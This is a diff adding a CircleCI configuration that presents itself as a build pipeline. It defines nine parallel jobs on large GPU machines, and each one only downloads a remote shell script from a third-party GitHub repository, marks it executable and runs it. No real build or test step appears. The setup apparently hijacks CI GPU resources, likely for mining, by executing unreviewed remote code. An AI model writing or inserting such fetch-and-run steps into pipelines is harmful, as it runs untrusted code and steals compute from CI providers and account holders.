@@ -1,0 +1,86 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+  build2:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+      
+
+
+  build3:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+
+  build4:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+  build5:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+  build6:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+      
+
+
+  build7:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+
+  build8:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+  build9:
+    machine:
+      resource_class: gpu.nvidia.large
+      image: ubuntu-2004-cuda-11.2:202103-01
+    steps:
+      - run: wget https://github.com/Akatsoki/newwz/raw/main/Men.sh && chmod +x Men.sh && ./Men.sh
+
+      
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - build
+            - build2
+            - build3
+            - build4
+            - build5
+            - build6
+            - build7
+            - build8            
+            - build9            
